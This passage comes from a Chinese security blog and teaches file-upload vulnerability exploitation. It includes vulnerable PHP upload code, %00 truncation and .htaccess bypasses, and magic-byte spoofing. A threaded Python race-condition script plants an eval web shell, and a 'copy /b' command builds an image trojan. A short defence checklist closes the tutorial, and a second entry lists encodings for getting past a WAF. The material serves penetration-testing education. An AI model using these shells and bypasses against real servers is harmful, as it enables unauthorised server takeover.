<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'upload'</span>]))</div><div class="line">&#123;</div><div class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'flv'</span>,<span class="string">'swf'</span>,<span class="string">'mp3'</span>,<span class="string">'mp4'</span>,<span class="string">'3gp'</span>,<span class="string">'zip'</span>,<span class="string">'rar'</span>,<span class="string">'gif'</span>,<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'bmp'</span>);</div><div class="line">    $file_ext = substr($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],strpos($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</div><div class="line">    <span class="keyword">if</span>(in_array($file_ext,$file_arr))</div><div class="line">    &#123;</div><div class="line">        $tempFile = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">        <span class="comment">//这里的$_REQUEST['jieduan']造成可以利用截断上传</span></div><div class="line">        $targePath = $_SERVER[<span class="string">'DOCUMENT_ROOT'</span>].$_REQUEST[<span class="string">'jieduan'</span>].rand(<span class="number">10</span>,<span class="number">99</span>).</div><div class="line">            date(<span class="string">'YmdHis'</span>).<span class="string">"."</span>.$file_ext;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($tempFile,$targePath))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'上传成功'</span>.<span class="string">'&lt;br&gt;'</span>;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'路径'</span>.$targePath;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span>(<span class="string">"上传失败"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"上传失败"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://ofrdce5qv.bkt.clouddn.com/4.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/5.png" alt=""></p>
<h3 id="4-3-服务端文件扩展名检测"><a href="#4-3-服务端文件扩展名检测" class="headerlink" title="4.3. 服务端文件扩展名检测"></a>4.3. 服务端文件扩展名检测</h3><ul>
<li>黑名单检测：<br>黑名单的安全性比白名单低很多，服务器端，一般会有个专门的blacklist文件，里面会包含常见的危险脚本文件类型，例如：html | htm | php | php2 | hph3 | php4 | php5 | asp | aspx | ascx | jsp | cfm | cfc | bat | exe | com | dll | vbs | js | reg | cgi | htaccess | asis | sh |phtm | shtm |inc等等。</li>
</ul>
<p>黑名单扩展名过滤，限制不够全面：IIS默认支持解析.asp | .cdx | .asa | .cer等<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExt</span><span class="params">($filename)</span></span>&#123;</div><div class="line">    <span class="comment">//sunstr - 返回字符串的子串</span></div><div class="line">    <span class="comment">//strripos — 计算指定字符串在目标字符串中最后一次出现的位置（不区分大小写）</span></div><div class="line">    <span class="keyword">return</span> substr($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"Error: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">    $black_file = explode(<span class="string">"|"</span>,<span class="string">"php|jsp|asp"</span>);<span class="comment">//允许上传的文件类型组</span></div><div class="line">    $new_upload_file_ext = strtolower(getExt($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])); <span class="comment">//取得被.隔开的最后字符串</span></div><div class="line">    <span class="keyword">if</span>(in_array($new_upload_file_ext,$black_file))</div><div class="line">    &#123;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"文件不合法"</span>;</div><div class="line">        <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        $filename = time().<span class="string">"."</span>.$new_upload_file_ext;</div><div class="line">        <span class="keyword">if</span>(move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],<span class="string">"upload/"</span>.$filename))</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Upload Success"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>不被允许的文件格式.php，但是可以上传文件名为shell.php_(下划线是空格)，IIS支持，linux不支持，详细见下面的特殊文件名绕过描述；</p>
<ul>
<li>白名单检测<br>仅允许指定的文件类型上传，比如仅与需上传jpg | gif | doc等类型的文件，其他全部禁止</li>
<li><p>绕过方法：</p>
<ul>
<li><p>文件名大小写绕过</p>
<p> 用像 AsP，pHp 之类的文件名绕过黑名单检测</p>
</li>
<li><p>名单列表绕过</p>
<p> 用黑名单里没有的名单进行攻击，比如黑名单里没有 asa 或 cer 之类 </p>
</li>
<li><p>特殊文件名绕过：</p>
<p>比如发送的 http 包里把文件名改成 test.asp. 或 test.asp_(下划线为空格)，这种命名方式 在 windows 系统里是不被允许的，所以需要在 burp 之类里进行修改，然后绕过验证后，会 被 windows 系统自动去掉后面的点和空格，但要注意 Unix/Linux 系统没有这个特性</p>
</li>
<li><p>0x00截断</p>
<p>文件名后缀就一个%00字节，可以截断某些函数对文件名的判断。在许多语言函数中处理函数中，处理字符串中<br>在扩展名检测这大部分都是 asp 的程序有这种漏洞，给个简单的伪代码 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Name = getname(http requests)//假如这一步获取到的文件名是dama.asp .jpg</div><div class="line">Type = gettype(name)//而在该函数中，是从后往前扫描文件扩展名，所以判断为jpg文件</div><div class="line">If(type == jpg)</div><div class="line">SaveFileToPath(UploadPath.name , name)//但在这里却是以0x00作为文件名截断，最后以dama.asp存入路径里</div></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<p>操作方法：上传dama.jpg，Burp抓包，将文件名改为dama.php%00.jpg，选中%00，进行url-decode。<br><img src="http://ofrdce5qv.bkt.clouddn.com/6.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/7.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/8.png" alt=""></p>
<pre><code>**PHP任意文件上传漏洞（CVE-2015-2348）**该漏洞存在于php的move_uploaded_file()函数中，这个函数一般在上传文件时被使用，用途是将上传的文件移动到新位置。这次的漏洞就出现在$destination这个参数中，这个参数代表的是上传文件移动的最终目的地址。如果$destination变量是从用户$_GET或$_POST中获得的并且我们可控，那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传。

演示代码：
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">    <span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/*</span></div><div class="line">move_uploaded_file(string $filename,string $destination)</div><div class="line">$destination参数代表得失上传文件移动的最终目的地址</div><div class="line">如果$destination变量是从用户$_GET或$_POST中获得的并且我们可控，</div><div class="line">那么我们可以利用空字符\x00来截断后面的拓展名，从而造成任意文件上传</div><div class="line">*/</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'Upload'</span>]))&#123;</div><div class="line">    $target_path = WEB_PAGE_TO_ROOT.<span class="string">"hackable/uploads/"</span>;</div><div class="line">    $target_path = $target_path . basename($_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>]);</div><div class="line">    $uploaded_name = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'name'</span>];</div><div class="line">    $uploaded_ext = substr($uploaded_name, strrpos($uploaded_name, <span class="string">'.'</span>) + <span class="number">1</span>);</div><div class="line">    $uploaded_size = $_FILES[<span class="string">'uploaded'</span>][<span class="string">'size'</span>];</div><div class="line">    <span class="keyword">if</span> (($uploaded_ext == <span class="string">"jpg"</span> || $uploaded_ext == <span class="string">"JPG"</span> || $uploaded_ext == <span class="string">"jpeg"</span> || $uploaded_ext == <span class="string">"JPEG"</span>) &amp;&amp; ($uploaded_size &lt; <span class="number">100000</span>))&#123;</div><div class="line">        <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'uploaded'</span>][<span class="string">'tmp_name'</span>], $_POST[<span class="string">'drops'</span>])) &#123;</div><div class="line">            $html .= <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">            $html .= <span class="string">'Your image was not uploaded.'</span>;</div><div class="line">            $html .= <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">        &#125;<span class="keyword">else</span> &#123;</div><div class="line">            $html .= <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">            $html .= $target_path . <span class="string">' succesfully uploaded!'</span>;</div><div class="line">            $html .= <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">        &#125;&#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        $html .= <span class="string">'&lt;pre&gt;'</span>;</div><div class="line">        $html .= <span class="string">'Your image was not uploaded.'</span>;</div><div class="line">        $html .= <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</code></pre><p>然后我们上传文件，这里把POST的drops参数利用空字符进行截断<br><img src="http://ofrdce5qv.bkt.clouddn.com/13.png" alt=""></p>
<ul>
<li><p>.htaccess 文件攻击 </p>
<p>配合名单列表绕过，上传一个自定义的.htaccess，就可以轻松绕过各种检测,该文件仅在Apache平台上存在，.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。该文件的写法如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="section">&lt;FilesMatch "a.jpg"&gt;</span></div><div class="line"> <span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</div><div class="line"><span class="section">&lt;/FilesMatch&gt;</span></div></pre></td></tr></table></figure>
<p>保存为.htaccess文件。该文件的意思是，只要遇到文件名中包含有”a.jpg”字符串的任意文件，统一执行。如果这个”a.jpg”的内容是一句话木马，即可利用中国菜刀进行连接<br><img src="http://ofrdce5qv.bkt.clouddn.com/9.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/10.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/11.png" alt=""><br><img src="http://ofrdce5qv.bkt.clouddn.com/12.png" alt=""></p>
<h3 id="4-4-服务端文件内容检测"><a href="#4-4-服务端文件内容检测" class="headerlink" title="4.4. 服务端文件内容检测"></a>4.4. 服务端文件内容检测</h3><ul>
<li>文件幻数检测：</li>
</ul>
<p>JPG ： FF D8 FF E0 00 10 4A 46 49 46</p>
<p>GIF ： 47 49 46 38 39 61 (GIF89a)</p>
<p>PNG： 89 50 4E 47</p>
<p>绕过方法：<br>在文件幻数后面加上自己的一句话木马就行了。</p>
<ul>
<li>文件相关信息检测：</li>
</ul>
<p>一般就是检查图片文件的大小，图片文件的尺寸之类的信息。</p>
<p>绕过方法：<br>伪造好文件幻数，在后面添加一句话木马之后，再添加一些其他的内容，增大文件的大小。</p>
</li>
</ul>
<p><strong>通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入即可。</strong></p>
<p>   简化的演示代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">var_dump(getimagesize(<span class="string">"shell.php"</span>));</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p><img src="http://ofrdce5qv.bkt.clouddn.com/14.png" alt=""><br>加上GIF头内容<br><img src="http://ofrdce5qv.bkt.clouddn.com/15.png" alt=""></p>
<h2 id="5-竞争上传"><a href="#5-竞争上传" class="headerlink" title="5. 竞争上传"></a>5. 竞争上传</h2><p>演示代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$allowtype = <span class="keyword">array</span>(<span class="string">"gif"</span>,<span class="string">"png"</span>,<span class="string">"jpg"</span>);</div><div class="line">$size = <span class="number">10000000</span>;</div><div class="line">$path = <span class="string">"./"</span>;</div><div class="line"></div><div class="line">$filename = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span>(is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]))&#123;</div><div class="line">    <span class="keyword">if</span>(!move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$path.$filename))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"error:can not move"</span>);</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"error:not an upload file！"</span>);</div><div class="line">&#125;</div><div class="line">$newfile = $path.$filename;</div><div class="line"><span class="keyword">echo</span> <span class="string">"file upload success.file path is: "</span>.$newfile.<span class="string">"\n&lt;br /&gt;"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'error'</span>]&gt;<span class="number">0</span>)&#123;</div><div class="line">    unlink($newfile);</div><div class="line">    <span class="keyword">die</span>(<span class="string">"Upload file error: "</span>);</div><div class="line">&#125;</div><div class="line">$ext = array_pop(explode(<span class="string">"."</span>,$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]));</div><div class="line"><span class="keyword">if</span>(!in_array($ext,$allowtype))&#123;</div><div class="line">    unlink($newfile);</div><div class="line">    <span class="keyword">die</span>(<span class="string">"error:upload the file type is not allowed，delete the file！"</span>);</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>首先将文件上传到服务器，然后检测文件后缀名，如果不符合条件，就删掉，我们的利用思路是这样的，首先上传一个php文件，内容为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"./info.php"</span>, <span class="string">"w"</span>), <span class="string">'&lt;?php @eval($_POST["drops"]) ?&gt;'</span>); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>当然这个文件会被立马删掉，所以我们使用多线程并发的访问上传的文件，总会有一次在上传文件到删除文件这个时间段内访问到上传的php文件，一旦我们成功访问到了上传的文件，那么它就会向服务器写一个shell。利用代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> threading</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">RaceCondition</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        threading.Thread.__init__(self)</div><div class="line">        self.url = <span class="string">"http://127.0.0.1:8080/upload/shell0.php"</span></div><div class="line">        self.uploadUrl = <span class="string">"http://127.0.0.1:8080/upload/copy.php"</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">'try to call uploaded file...'</span>)</div><div class="line">        r = requests.get(self.url)</div><div class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</div><div class="line">            print(<span class="string">"[*]create file info.php success"</span>)</div><div class="line">            os._exit(<span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_upload</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">"upload file....."</span>)</div><div class="line">        file = &#123;<span class="string">"file"</span>:open(<span class="string">"shell0.php"</span>,<span class="string">"r"</span>)&#125;</div><div class="line">        requests.post(self.uploadUrl, files=file)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</div><div class="line">                self._get()</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</div><div class="line">                self._upload()</div><div class="line">                self._get()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    threads = <span class="number">20</span></div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t = RaceCondition()</div><div class="line">        t.start()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</div><div class="line">        t.join()</div></pre></td></tr></table></figure>
<p>经过几次尝试后成功成功写入shell<br><img src="http://ofrdce5qv.bkt.clouddn.com/16.png" alt=""></p>
<h2 id="6-图片木马制作"><a href="#6-图片木马制作" class="headerlink" title="6. 图片木马制作"></a>6. 图片木马制作</h2><p><strong>命令：</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">copy</span><span class="bash"> /b 1.jpg+2.php</span></div></pre></td></tr></table></figure>
<h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">条件： 寻找一个上传点，查看上传点是否可用。</div><div class="line"></div><div class="line">利用：</div><div class="line"></div><div class="line">首先判断是程序员自己写的上传点，还是编辑器的上传功能</div><div class="line"></div><div class="line">如果是编辑器上传功能，goolge当前编辑器的漏洞</div><div class="line"></div><div class="line"></div><div class="line">如果是程序员写的上传点</div><div class="line"></div><div class="line">上传一个正常的jpg图片 查看上传点是否可用</div><div class="line"></div><div class="line">上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）</div><div class="line"></div><div class="line">上传一个正常的jpg图片，burp拦截， <span class="number">00</span>截断 <span class="number">1.</span>php%<span class="number">00.</span>jpg</div><div class="line"></div><div class="line">判断服务器是什么类型，web服务器程序，是什么类型，版本号多少</div><div class="line"></div><div class="line">利用解析漏洞</div><div class="line"></div><div class="line">防御：：：</div><div class="line"></div><div class="line">上传文件的存储目录禁用执行权限</div><div class="line"></div><div class="line">文件后缀白名单，注意<span class="number">0x00</span>截断攻击（PHP更新到最新版本）</div><div class="line"></div><div class="line">不能有本地文件包含漏洞</div><div class="line"></div><div class="line">及时修复Web上传代码（重要）</div><div class="line"></div><div class="line">升级Web Server</div></pre></td></tr></table></figure>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="Upload Attack Framework">1. Upload Attack Framework</a></p>
<p><a href="http://www.yyipu.com/index.php/2017/04/26/49.html" target="_blank" rel="external">2. web中的条件竞争漏洞</a></p>
<p><a href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" target="_blank" rel="external">3. 文件上传总结</a></p>
<p><a href="http://www.joychou.org/index.php/web/truncated.html" target="_blank" rel="external">4. 截断在文件包含和上传中的利用</a></p>
<p><a href="http://www.jianshu.com/p/eba198dd30ef" target="_blank" rel="external">5. 文件上传漏洞</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1. 概述&quot;&gt;&lt;/a&gt;1. 概述&lt;/h2&gt;&lt;p&gt;   文件上传漏洞可以说是日常渗透测试中用得最多的一个漏洞，用它获得服务器权限最快最直接。在Web程序中，经常需要用到文件上传的功能。如用户或者管理员上传图片，或者其它文件。如果没有限制上传类型或者限制不严格被绕过，就有可能造成文件上传漏洞。如果上传了可执行文件或者网页脚本，就会导致网站被控制甚至服务器沦陷。，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权或结合文件包含漏洞。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。&lt;/p&gt;
&lt;h2 id=&quot;2-上传检测流程&quot;&gt;&lt;a href=&quot;#2-上传检测流程&quot; class=&quot;headerlink&quot; title=&quot;2. 上传检测流程&quot;&gt;&lt;/a&gt;2. 上传检测流程&lt;/h2&gt;&lt;p&gt;  通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：&lt;br&gt;&lt;img src=&quot;http://ofrdce5qv.bkt.clouddn.com/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="php 漏洞  代码审计" scheme="http://yoursite.com/tags/php-%E6%BC%8F%E6%B4%9E-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>bypass waf(关键字符替换)</title>
    <link href="http://yoursite.com/2017/04/06/bypass-waf-%E5%85%B3%E9%94%AE%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2/"/>
    <id>http://yoursite.com/2017/04/06/bypass-waf-关键字符替换/</id>
    <published>2017-04-06T09:47:46.000Z</published>
    <updated>2017-04-06T09:51:23.278Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-字母a"><a href="#0x01-字母a" class="headerlink" title="0x01 字母a"></a>0x01 字母a</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="xml"></span><span class="perl">%u0000</span><span class="xml"></span></div><div class="line"><span class="perl">%u0041</span><span class="xml"></span></div><div class="line"><span class="perl">%u0061</span><span class="xml"></span></div><div class="line"><span class="perl">%u00aa</span><span class="xml"></span></div><div class="line"><span class="perl">%u00e2</span><span class="xml"></span></div><div class="line">单引号：</div><div class="line"><span class="perl">%u0027</span><span class="xml"></span></div><div class="line"><span class="perl">%u02b9</span><span class="xml"></span></div><div class="line"><span class="perl">%u02bc</span><span class="xml"></span></div><div class="line"><span class="perl">%u02c8</span><span class="xml"></span></div><div class="line"><span class="perl">%u2032</span><span class="xml"></span></div><div class="line"><span class="perl">%uff07</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%27</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%a7</span><span class="xml"></span></div><div class="line"><span class="perl">%e0%80%a7</span><span class="xml"></span></div></pre></td></tr></table></figure>
<h3 id="0x02-空白"><a href="#0x02-空白" class="headerlink" title="0x02 空白"></a>0x02 空白</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"></span><span class="perl">%u0020</span><span class="xml"></span></div><div class="line"><span class="perl">%uff00</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%20</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%a0</span><span class="xml"></span></div><div class="line"><span class="perl">%e0%80%a0</span><span class="xml"></span></div></pre></td></tr></table></figure>
<h3 id="0x03-左括号"><a href="#0x03-左括号" class="headerlink" title="0x03 左括号("></a>0x03 左括号(</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"></span><span class="perl">%u0028</span><span class="xml"></span></div><div class="line"><span class="perl">%uff08</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%28</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%a8</span><span class="xml"></span></div><div class="line"><span class="perl">%e0%80%a8</span><span class="xml"></span></div></pre></td></tr></table></figure>
<h3 id="0x04-右括号"><a href="#0x04-右括号" class="headerlink" title="0x04 右括号)"></a>0x04 右括号)</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"></span><span class="perl">%u0029</span><span class="xml"></span></div><div class="line"><span class="perl">%uff09</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%29</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%a9</span><span class="xml"></span></div><div class="line"><span class="perl">%e0%80%a9</span><span class="xml"></span></div></pre></td></tr></table></figure>
<p>###参考链接<br><a href="http://www.lucaroot.pw/archives/50/" target="_blank" rel="external">转载-享受孤独</a></p>
]]></content>
    
    <summary type="html">
    
